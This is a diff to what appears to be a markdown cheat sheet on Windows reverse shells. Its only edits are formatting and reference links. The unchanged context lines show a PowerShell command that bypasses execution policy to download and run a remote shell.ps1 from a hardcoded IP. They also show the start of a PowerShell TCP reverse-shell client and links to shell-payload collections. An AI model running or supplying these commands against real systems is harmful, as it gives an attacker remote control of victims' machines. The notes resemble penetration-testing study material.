@@ -35,7 +35,7 @@ D:\> powershell -exec bypass -c "iwr(\"http://192.168.0.159:8002/shell.ps1\")|ie
 ```
 
 ## Powershell shell example
-```console
+```
 $client = New-Object System.Net.Sockets.TCPClient("192.168.0.159:8001",8001);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
@@ -53,6 +53,6 @@ $client.Close()
 ```
 
 ## Util infos
-https://github.com/davehardy20/PowerShell-Scripts
-https://book.hacktricks.xyz/shells/shells/windows
-https://www.revshells.com/
+- https://github.com/davehardy20/PowerShell-Scripts
+- https://book.hacktricks.xyz/shells/shells/windows
+- https://www.revshells.com/
